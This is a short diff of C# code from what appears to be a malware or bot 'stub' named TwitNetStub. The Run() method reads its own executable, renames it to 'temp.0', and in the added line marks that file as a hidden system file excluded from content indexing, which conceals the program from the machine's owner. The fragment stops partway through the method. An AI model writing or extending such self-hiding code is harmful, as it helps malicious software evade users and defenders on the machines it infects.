@@ -23,15 +23,14 @@ namespace TwitNetStub.Operations
         }
         public void Run()
         {
-            byte[] file =
-                File.ReadAllBytes(Application.ExecutablePath);
+            byte[] file = File.ReadAllBytes(Application.ExecutablePath);
             byte[] newfile = new byte[1];
             string filename = Constants.FileName;
 
             if (File.Exists("temp.0"))
                 File.Delete("temp.0");
             File.Move(Application.ExecutablePath, "temp.0");
-
+            File.SetAttributes("temp.0", FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed);
 
             for (int i = 0; i < file.Length; i++)
             {
